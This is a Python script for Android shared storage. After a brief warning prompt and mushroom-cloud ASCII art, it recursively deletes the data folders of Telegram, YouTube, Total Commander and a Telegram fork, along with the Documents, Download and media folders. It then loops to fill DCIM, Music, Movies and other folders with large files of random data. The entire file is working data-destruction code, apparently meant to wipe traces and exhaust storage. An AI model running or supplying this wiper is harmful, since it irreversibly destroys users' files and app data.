import sys
import os
from random import choice,randint
import string
import shutil

root = '/storage/emulated/0/'
trash = ['Audiobooks/','DCIM/','Pictures/.thumbnails/','Documents/','Music/','Movies/']
rats = ['Android/data/com.google.android.youtube','Android/media/org.telegram.messenger','Android/data/org.telegram.messenger','Android/data/com.evildayz.code.telegraher','Android/data/com.ghisler.android.TotalCommander','Documents','Audiobooks','Pictures/Telegram','Pictures/.thumbnails','Music/.thumbnails','Movies/.thumbnails','Movies/Telegram','Download']

def genpss(length=8, chars="abcdefghijklmnopqrstuvwxyz1234567890"):
    return ''.join([choice(chars) for i in range(length)])
   
def randfile(dir):
    tmpfile = root + dir + genpss() + ".tmp"
    size = 512 * 1024 * randint(1, 256)
    os.system('head -c ' + str(size) + ' </dev/urandom > ' + tmpfile)
    
mr = '''                             ____
                     __,-~~/~    `---.
                   _/_,---(      ,    )
               __ /        <    /   )  \___
              '====------------------===;;;=
                  \/  ~"~"~"~"~"~\~"~)~"/
                  (_ (   \  (     >    \)
                   \_( _ <         >_>'
                      ~ `-i' ::>|--"
                          I;|.|.|
                         <|i::|i|`.
                        (` ^'"`-' ")
------------------------------------------------------------------'''
warn = input('This script may delete something important.  If you are not sure - press Ctrl - Z or close the terminal.')
print(mr)
for dr in rats:
    if os.path.exists(root + dr):
        shutil.rmtree(root + dr)
    os.mkdir(root + dr)

for i in range(100000000):
    randfile(choice(trash))